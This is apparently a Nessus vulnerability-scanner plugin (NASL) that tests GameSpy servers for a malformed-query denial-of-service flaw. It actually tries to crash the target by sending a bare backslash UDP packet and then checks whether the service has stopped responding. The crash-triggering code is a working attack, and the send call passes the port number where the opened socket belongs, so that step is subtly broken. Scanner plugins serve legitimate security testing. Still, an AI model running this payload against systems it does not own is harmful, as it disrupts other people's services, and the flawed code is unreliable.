#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(12081);
 script_version ("$Revision: 1.4 $");
 script_bugtraq_id(9741);
 script_xref(name:"OSVDB", value:"16585");
 
 script_name(english:"GameSpy SDK Malformed \query\ Request Overflow DoS");
 script_summary(english:"Disables the remote GameSpy Server");

 script_set_attribute(attribute:"synopsis", value:
"The remote server is affected by a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote GameSpy server could be disabled by sending a malformed
packet. An attacker could exploit this flaw to crash the affected
application." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2004-02/0635.html" );
 script_set_attribute(attribute:"solution", value:
"Filter incoming traffic to this port, or disable this service" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );


script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_dependencies("gamespy_detect.nasl");
 script_require_keys("Services/udp/gamespy");
 exit(0);
}

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/udp/gamespy");
if ( ! port ) exit(0);
else port = int(port);

soc = open_sock_udp(port);
send(socket:soc, data:string("\\players\\rules\\status\\packets\\"));
r = recv(socket:soc, length:4096, timeout:2);
close(soc);
if(strlen(r) > 0)
{
 soc = open_sock_udp(port);
 send(socket:port, data:"\\");
 r = recv(socket:soc, length:4096, timeout:2);
 close(soc);
 if ( ! strlen(r) )
 {
  soc = open_sock_udp(port);
  send(socket:soc, data:string("\\players\\rules\\status\\packets\\"));
  r = recv(socket:soc, length:4096, timeout:2);
  close(soc);
  if ( ! strlen(r) ) security_warning(port);
 }
}
